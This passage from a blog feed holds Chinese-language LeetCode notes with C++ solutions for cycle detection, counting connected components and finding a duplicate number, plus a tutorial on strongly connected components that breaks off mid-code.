</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> edge: edges)&#123;</span><br><span class="line">            <span class="comment">// construct adjacency list</span></span><br><span class="line">            adjList[edge[<span class="number">0</span>]].<span class="built_in">push_back</span>(edge[<span class="number">1</span>]);</span><br><span class="line">            adjList[edge[<span class="number">1</span>]].<span class="built_in">push_back</span>(edge[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">            <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">visited</span><span class="params">(n+<span class="number">1</span>, <span class="literal">false</span>)</span></span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">dfs</span>(visited, adjList,<span class="number">-1</span>, edge[<span class="number">0</span>]))&#123;</span><br><span class="line">                <span class="comment">// cycle detected, return redundant edge</span></span><br><span class="line">                <span class="keyword">return</span> edge;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>這裡不單獨用迴圈迭代 <code>edge</code> 來建構鄰接串列，而是在迭代過程中一邊加入，之後就去檢查是否有 Cycle。</strong> 由於條件 <code>1 &lt;= ai &lt; bi &lt;= edges.length</code> 因此用於存儲造訪狀態的陣列 <code>visited</code> 以及 <code>adjList</code> 的大小會是 <code>n+1</code>。 接著就可以進行 DFS。</p><p>這題的 DFS 函式 <code>bool dfs(vector&lt;bool&gt; &amp;visited, vector&lt;vector&lt;int&gt;&gt; &amp;adjList, int prevNode, int node)</code> 主要用於檢測有無 Cycle。因此在造訪節點後首先更新 <code>visited</code> 為 <code>true</code> 並且迭代當前節點的鄰居，確保所有相鄰的節點都會被檢查。接著 <code>if(neighbor == prevNode) continue;</code> 代表跳過來自 prevNode 的邊，這是因為無向圖中，每條邊都是雙向的，(<code>1</code> 接到 <code>2</code> 等同於 <code>2</code> 接到 <code>1</code>)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1-2</span><br></pre></td></tr></table></figure><p>接著就是檢測環</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (visited[neighbor] || <span class="built_in">dfs</span>(visited, adjList, node, neighbor))</span><br></pre></td></tr></table></figure><ul><li>如果 <code>neighbor</code> 已經被造訪過，代表存在一條 回到已訪問節點的邊，這就是一個環，直接回傳 true</li><li>如果 <code>neighbor</code> 沒訪問過，則使用 dfs() 遞迴往下探索，如果在後續遞迴中找到了環，則回傳 true</li></ul><p>如果到最後都沒檢查出環，那就是 false。回到 <code>findRedundantConnection</code> 如果有環，那就回傳當前的邊 <code>edge</code> 做為需要移除的邊，如果無環，則回傳空陣列。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/684/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><p>時間複雜度<br>$O(V + E)$，在無向圖中通常 E ≈ V，所以 DFS 的複雜度可以近似為 $O(V)$</p><p>空間複雜度<br>$O(V+E)$ 儲存 $V$ 個節點跟  $E$ 條邊</p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Graph </tag>
            
            <tag> DFS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>無向圖中連通元件的數量 | Medium | LeetCode#323. Number of Connected Components in an Undirected Graph</title>
      <link href="/posts/ff5764dc.html"/>
      <url>/posts/ff5764dc.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/323/question.jpeg"></p><ul><li>題目難度：<code>Medium</code></li><li>題目描述： 給定一張圖中有 <code>n</code> 個節點，以及一個陣列 <code>edges</code> 其中 <code>edges[i] = [a_i, b_i]</code> 代表從節點A到節點B存在 Edge，本題要求回傳這個圖紹 Connected Components 的數量。</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>由於題目給得是 <code>edge</code> 的陣列，可以由此陣列去建構出一個 <code>n x n</code> 的鄰接矩陣，如果矩陣中有值就為 <code>true</code> 開始針對已經有 <code>true</code> 的節點進行 DFS 然後每次返回到 Caller 時就讓某變數 <code>sum</code> 增加一，最後再回傳 <code>sum</code> 即可，就代表 Connected Components 的數量。</p><blockquote><p>但 <code>n x n</code> 的鄰接矩陣，如果想要去選取出發點，勢必須要透過雙重迴圈來尋找，只要 <code>n</code> 夠大就會 Time Limit Excced，因此改良做法是改成鄰接串列（Adjacency List）</p></blockquote><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;adjList, vector&lt;<span class="type">bool</span>&gt; &amp;visited, <span class="type">int</span> node)</span></span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(visited[node]) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">            visited[node] = <span class="literal">true</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> neighbor: adjList[node])&#123;</span><br><span class="line">                <span class="built_in">dfs</span>(adjList, visited, neighbor);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">countComponents</span><span class="params">(<span class="type">int</span> n, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; edges)</span> </span>&#123;</span><br><span class="line">            <span class="comment">// Define a adjacency list</span></span><br><span class="line">            vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; adjList;</span><br><span class="line">            <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">visited</span><span class="params">(n, <span class="literal">false</span>)</span></span>;</span><br><span class="line">            <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            adjList.<span class="built_in">resize</span>(n);</span><br><span class="line">            <span class="comment">// Construct adjacency list</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt; edges.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">                adjList[edges[i][<span class="number">0</span>]].<span class="built_in">push_back</span>(edges[i][<span class="number">1</span>]);</span><br><span class="line">                adjList[edges[i][<span class="number">1</span>]].<span class="built_in">push_back</span>(edges[i][<span class="number">0</span>]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Perform DFS, and calculate the number of connected components</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;n; i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(!visited[i])&#123;</span><br><span class="line">                    <span class="built_in">dfs</span>(adjList, visited, i);</span><br><span class="line">                    sum++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> sum;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在 <code>countComponents</code> 中初始化鄰接串列 <code>adjList</code> , 用於儲存走訪狀態的陣列 <code>visited</code> 以及紀錄 connected components 數量的變數 <code>sum</code> 之後將 <code>adjList</code> 初始化大小為 <code>n</code>。</p><p>建構 <code>adList</code> 的時候，可以回憶一下鄰接串列的特性，對於每個節點 <code>i</code>，其 subVector 的元素就是與 <code>i</code> 相鄰的節點</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">[0] | [1,5,7,9]</span><br><span class="line">[1] | [2,4,5,6]</span><br><span class="line">[2] | [3,5]</span><br><span class="line">[3] | [0,9,]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>對於每個 <code>edges[i]</code> 其第一個元素 <code>edges[i][0]</code> 要作為 <code>adjList</code> 的 index 然後將對應接到的node <code>edges[i][1]</code> push到 subVector。另外本題是一個無向圖，因此只要存在 <code>[a_i, b_i]</code> 那一定也存在 <code>[b_i, a_i]</code>。所以也需要將 <code>edges[i][1]</code> 作為 index 然後將其 <code>edges[i][0]</code> push 到 subvector 中。</p><p>後面尋找起點主要是迭代 <code>visited[n]</code> 只要發現有尚未造訪的節點 (<code>visited[i]== false</code>)，就會去進行DFS。在 DFS 過程中，每次帶訪節點會去將 <code>visited[node]</code> 標注為已造訪 (<code>true</code>)。在 <code>dfs</code> 中，對於每個傳入的 <code>node</code>會去透過 <code>adjList</code> 看其對應的 subVector 是否有相鄰的節點是尚未造訪的，但如果造訪過了就會回傳。 只要 dfs結束回到 <code>countComponents</code> 的時候就代表已經走房完成一個 Connected Components，此時可以將 <code>sum</code> 增加。 走訪完全圖後就回傳  <code>sum</code>。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/323/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><p>時間複雜度<br>$O(V+E)$ 建構 <code>adjList</code> 會需要拜訪 <code>E</code> 個 edge，另外走訪完全圖，一共會走訪到 <code>V</code> 個節點。     </p><p>空間複雜度<br>$O(V+E)$ 需要儲存 <code>V</code> 個節點 並且有 <code>E</code>個 edge </p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Graph </tag>
            
            <tag> DFS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>找出重複數字| Medium | LeetCode#287. Find the Duplicate Number</title>
      <link href="/posts/b8be61c6.html"/>
      <url>/posts/b8be61c6.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/287/question.jpeg"></p><ul><li>題目難度: <code>medium</code></li><li>題目敘述: 題目給定一個整數陣列 <code>nums</code> 包含了 <code>n+1</code> 個數字，每個數字範圍為 <code>[1,n]</code> ，在 <code>nums</code> 只會有一種數字重複，請回傳是哪個數字重複。</li></ul><div class="note warning flat"><p><strong>這題要求只能使用常數空間，並且不能夠修改 <code>nums</code> 本身</strong></p></div><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>這題規定只能使用常數空間，就代表要用時間換空間，基本上陣列或是 <code>unordered_set</code> 這種額外樣保存 n筆陣列資料的方式都不能用了，另外如果直接使用雙重回圈暴力解應該也會 TLE，因此這裡需要別的做法</p><h2 id="解法-1"><a href="#解法-1" class="headerlink" title="解法"></a>解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findDuplicate</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> left = <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> right = nums.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(left &lt; right)&#123;</span><br><span class="line">            <span class="type">int</span> mid = left + (right - left) /<span class="number">2</span>;</span><br><span class="line">            <span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> num: nums)&#123;</span><br><span class="line">                <span class="keyword">if</span>(num&lt;=mid)&#123;</span><br><span class="line">                    count++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(count &gt; mid)&#123;</span><br><span class="line">                right = mid;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                left = mid+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡透過 Binary Search 的方式先針對所有數字範圍 <code>[1,2,...n]</code> 進行檢索。首先計算出中間值 <code>mid</code>。並且宣告一個變數 <code>count</code>。 接著迭代 <code>nums</code> 陣列。如果陣列數字比中間值小，<code>counter</code> 就增加。這樣的好處在可以用於檢測重複數字</p><p>舉例來說，下面的情況是經過for迴圈後的結果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nums = [1,2,3,2,1]</span><br><span class="line">mid = 3</span><br><span class="line">count = 5 </span><br></pre></td></tr></table></figure><p>明明只有數字 <code>1</code>, <code>2</code>, <code>3</code> 比中間值 <code>mid=3</code>小，而累計次數 <code>count</code> 卻為 <code>5</code> 就代表有數字重複，因此可以繼續收窄 <code>mid</code> 的範圍，這時就可以往<code>mid</code>左邊收窄。 <code>right = mid</code> 反之則往<code>mid</code> 收窄。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/287/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><p>時間複雜度: $O(NlogN)$</p><p>空間複雜度: $O(1)$</p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Array </tag>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Binary Search </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷題知識整理 | 圖(Graph)-3</title>
      <link href="/posts/597eaffb.html"/>
      <url>/posts/597eaffb.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>要能夠確保像是有先修微積分，才能修工程數學，這種 <strong>有前後關係的圖論問題</strong>，通常會用 <strong>拓樸排序(Topological Sort)</strong> </p><p><img src="/img/LeetCode/graph/course.png"></p><h1 id="利用-DFS-尋找-Strong-Connected-Components-SCC"><a href="#利用-DFS-尋找-Strong-Connected-Components-SCC" class="headerlink" title="利用 DFS 尋找 Strong Connected Components(SCC)"></a>利用 DFS 尋找 Strong Connected Components(SCC)</h1><h2 id="Strong-Connected-Components-SCC"><a href="#Strong-Connected-Components-SCC" class="headerlink" title="Strong Connected Components (SCC)"></a>Strong Connected Components (SCC)</h2><blockquote><p>Vertex 之間有雙向的 Edge 相連，例如 從 vertex(A) 走到 vertex(B) 同時 vertex(B) 也要有 edge 連到 vertex(A)，就會說這兩個vertex 是 strongly connected 的。</p></blockquote><p><strong>通常可以透過多次的 DFS 來確定 Directed Graph 中有哪些 Strongly Connected Components</strong> ， 要進行多次DFS的原因在於，只有一次DFS 可能沒辦法識別出全部的 COnnected Components，根據搜尋起點的不同，有可能也會將不同。每次在查找 Connected Components 的時候都會各自有 Depth-First Search Tree，根據不同的搜尋起點選擇，可能會形成一個大棵的Depth-First Search Tree。</p><details class="toggle" style="border: 1px solid bg"><summary class="toggle-button" style="background-color: bg;color: color">以 vertex(I) vertex(F) vertex(B) 為搜尋起點 </summary><div class="toggle-content"><p><img src="/img/LeetCode/graph/SCC.png"><br><img src="/img/LeetCode/graph/SCC-1.png"></p></div></details><details class="toggle" style="border: 1px solid bg"><summary class="toggle-button" style="background-color: bg;color: color">以 vertex(A) 為搜尋起點 </summary><div class="toggle-content"><p><img src="/img/LeetCode/graph/SCC-4.png"><br><img src="/img/LeetCode/graph/SCC-3.png"></p></div></details><p>透過上面圖片可以觀察到，如果以 vertex(I), vertex(F), vertex(B) 為搜尋起點可以找到三個 SCC，並且各自有各自的 Depth-First Search Tree，但如果以 Vertex(A) 為搜尋起點，只會有一個大的 SCC，真正的三個SCC並沒有被分隔開。 </p><h2 id="Component-Graph"><a href="#Component-Graph" class="headerlink" title="Component Graph"></a>Component Graph</h2><p>這裡如果Directed Graph 中有多個SCC，可以將SCC視為一個更大的Vertex $V^{\text{SCC}}$，而 SCC 彼此相連的 Edge 則會是 Component Graph 中的 Edge $E^{\text{SCC}}$ 其中</p><div class="note info flat"><p>$C_1 &#x3D; {A,B,C,D}$<br>$C_2 &#x3D; {E, F}$<br>$C_3 &#x3D; {G, H , I}$<br>$V^{\text{SCC}} &#x3D; [C_1, C_2, C_3 ]$<br>$E^{\text{SCC}} &#x3D; [ (C,E),(D,F),(E,G),(F,G),(F,H) ]$</p></div><p><img src="/img/LeetCode/graph/SCC-5.png"></p><blockquote><p>特性:</p><ol><li><strong>對於任意 Directed Graph，將其SCC視為 Vertex，就能夠構成 Component Graph</strong></li><li><strong>Component graph一定是directed acyclic graph(DAG)</strong>: 這是因為如果C1,C2之間存在Cycle，則他們彼此之間就不會是 SCC，而會合併成一個更大的SCC， <strong>所以不同的SCC之間一定不存在 Cycle</strong></li></ol></blockquote><p>所以這裡就回到剛剛的問題，透過一次DFS 根據不同搜尋起點，沒辦法正確分辨出SCC，<strong>如何選搜尋起點才能夠分辨出對應的SCC呢？</strong></p><p><img src="/img/LeetCode/graph/DAG.png"></p><details class="toggle" style="border: 1px solid bg"><summary class="toggle-button" style="background-color: bg;color: color">不同起點形成不同DFS Tree </summary><div class="toggle-content"><p>以 C3當起點，可以順利識別出所有SCC<br><img src="/img/LeetCode/graph/DAG-1.png"></p><p>以 C2當起點，僅能識別出兩個SCC<br><img src="/img/LeetCode/graph/DAG-2.png"></p><p>以 C1當起點，無法順利識別出三個SCC<br><img src="/img/LeetCode/graph/DAG-3.png"></p></div></details><p>上面可以得到一個特性，就是 <strong>若DFS()在每次尋找「新的搜尋起點時」，能夠按照「一條path上，從尾端至開頭」的vertex順序，那麼Predecessor Subgraph就能長成「能夠分辨出SCC」的Depth-First Forest。</strong> </p><blockquote><p>接下來問題就會是，如何確保每一次都能找到「一條path上，從尾端至開頭的vertex順序」？</p></blockquote><p>如果觀察上面 Recursion Call (DFS Tree) 的圖片可以發現，不管搜尋起點怎麼選，如果以最終結束時間 (Finish Time, 紅色虛線) 來看，一定會是 $C_1 &gt; C_2 &gt; C_3$，其實這並不是什麼特別的原理，這超直覺，如果今天在一個 Directed Graph 中存在 Vertex(A) 跟 Vertex(B)，並且存在 edge(A, B) 那 Vertex(A) 的結束時間一定比 Vertex(B) 大，要嘛你選Vertex(A) 當搜尋起點，那你一定會先走到Vertex(B)，Vertex(B) 結束後才輪到 Vertex(A) 結束，今天如果選擇 Vertex(B) 當搜尋起點，但是 vertex(B) 沒有指向其他節點，因此它做完後，選擇 Vertex(A) 當搜尋起點，一樣他的結束時間會是最大。</p><p>因此</p><blockquote><p><strong>若directed graph中存在edge(X,Y)，那麼，C1集合中所有vertex的「最大finish」一定比C2集合中所有vertex的「最大finish」還要大。</strong></p></blockquote><p>所以以上面 Component Graph 而言， <code>finish[C1] &gt; finish[C2] &gt; finish[C3]</code> ，如果回頭以 Finish Time 角度來看前面這張圖</p><p><img src="/img/LeetCode/graph/SCC-1.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C1=[A,B,C,D]</span><br><span class="line">finish[C1]= finish[B]=18</span><br><span class="line"></span><br><span class="line">C2=[E,F]</span><br><span class="line">finish[C2]=finish[F]=10</span><br><span class="line"></span><br><span class="line">C3=[G,H,I]</span><br><span class="line">finish[C3]=finish[I]=6</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>這裡可以發現一件事，<strong>只要按照「finish小到大」的順序選取SCC中的vertex作為DFS()的起點，就能夠在Predecessor Subgraph中以Depth-First Forest分辨出所有SCC。</strong> 因此這裡可以先歸納出三個步驟：</p><ol><li>先對任意 Vertex進行 DFS 取的 Finish 資訊</li><li>根據所獲取的順序，來判斷第二次DFS的起點順序</li><li>進行第二次 DFS 來獲得 Predecessor Subgraph 來獲取 SCC</li></ol><blockquote><p>不過第一點還是會有問題，因此第一點再選擇 Vertex 並沒有對SCC的先備知識，因此生成的 finish 順序不一定能夠反映 SCC 的正確拓撲結構。如果第一次 DFS 未能按某種「全局順序」遍歷強連通分量，則 finish 順序可能與 SCC 的真實結構無關，這可能會導致從後序的 SCC透過某些Edge 回到前序的 SCC</p></blockquote><p>這裡可以透過轉置(Transpose) 來解決這個問題，從後序的 SCC 可能回到前序的 SCC，這會使得單純按照 finish 小到大的順序難以正確區分 SCC。透過轉置，在 $G^T$中， <strong>SCC 之間的方向依賴性被逆轉，保證 DFS 能按照 finish 大到小的順序正確地一層一層分離 SCC。</strong></p><p>這裡可以發現 $G 和 $G^T$ 的 Component 一樣，但是 finish 的順序完全相反，所以第一次進行DFS後得到的finish 時間會是由大而小，轉置後就會是由小而大。<br><img src="/img/LeetCode/graph/transpose.png"></p><p>因此，以 <strong>第一次DFS()所得到的finish之由大到小順序</strong> 選取起點，在 $G^T$ 上進行第二次DFS，就可以先選到 C1，由於無法從C1走回C2，因此 DFS 在搜尋完C1內的所有vertex後，便形成自己的Depth-First Tree。接著再依序挑選C2、C3為起點進行搜尋，並且建立起各自SCC的Depth-First Tree。這樣就找到了directed graph中的所有的SCC</p><h2 id="演算法"><a href="#演算法" class="headerlink" title="演算法"></a>演算法</h2><ul><li>對 $G$ 進行 DFS</li><li>對 $G$ 轉置，獲得 $G^T$</li><li>按照第一次 DFS 的 finish 順序「由大到小」依次對 $G^T$ 的節點執行 DFS，每次 DFS 會遍歷一個 SCC，</li><li>從第二次DFS 的predecessor找到Predecessor Subgraph (若directed graph有多個SCC，那麼Predecessor Subgraph就會是Depth-First Forest，其中的每一棵Depth-First Tree都是一個SCC)</li></ul><h2 id="程式碼"><a href="#程式碼" class="headerlink" title="程式碼"></a>程式碼</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Graph</span> &#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="type">int</span> num_vertex;</span><br><span class="line">        vector&lt;list&lt;<span class="type">int</span>&gt;&gt; AdjList;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">DFSVisit</span><span class="params">(<span class="type">int</span> v, vector&lt;<span class="type">bool</span>&gt; &amp;visited, stack&lt;<span class="type">int</span>&gt; &amp;finishStack)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">DFSVisitSCC</span><span class="params">(<span class="type">int</span> v, vector&lt;<span class="type">bool</span>&gt; &amp;visited, vector&lt;<span class="type">int</span>&gt; &amp;component)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="built_in">Graph</span>(<span class="type">int</span> N): <span class="built_in">num_vertex</span>(N) &#123;</span><br><span class="line">            AdjList.<span class="built_in">resize</span>(num_vertex);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">AddEdgeList</span><span class="params">(<span class="type">int</span> from, <span class="type">int</span> to)</span></span>;</span><br><span class="line">        <span class="function">Graph <span class="title">GraphTranspose</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">FindSCCs</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Graph::AddEdgeList</span><span class="params">(<span class="type">int</span> from, <span class="type">int</span> to)</span></span>&#123;</span><br><span class="line">    AdjList[from].<span class="built_in">push_back</span>(to);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Graph::DFSVisit</span><span class="params">(<span class="type">int</span> v, vector&lt;<span class="type">bool</span>&gt; &amp;visited, stack&lt;<span class="type">int</span>&gt; &amp;finishStack)</span></span>&#123;</span><br><span class="line">    visited[v] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> neighbor: 